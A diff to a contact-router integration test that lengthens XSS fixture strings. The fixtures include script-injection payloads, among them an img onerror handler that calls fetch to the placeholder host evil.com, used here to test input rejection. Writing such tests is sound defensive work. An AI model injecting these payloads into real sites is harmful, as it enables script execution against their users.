@@ -111,20 +111,20 @@ describe("Contact Router - Integration Tests", () => {
         {
           name: "<img src=x onerror='alert(1)'>",
           email: "test@example.com",
-          subject: "Test",
+          subject: "Test subject",
           content: "Valid content here",
         },
         {
           name: "João",
           email: "test@example.com",
           subject: "<script>alert('xss')</script>",
-          content: "Valid content",
+          content: "Valid content with length",
         },
         {
           name: "João",
           email: "test@example.com",
-          subject: "Test",
-          content: "<img src=x onerror='fetch(\"http://evil.com\")'> content",
+          subject: "Test subject",
+          content: "<img src=x onerror='fetch(\"http://evil.com\")'> valid content here",
         },
       ];
 
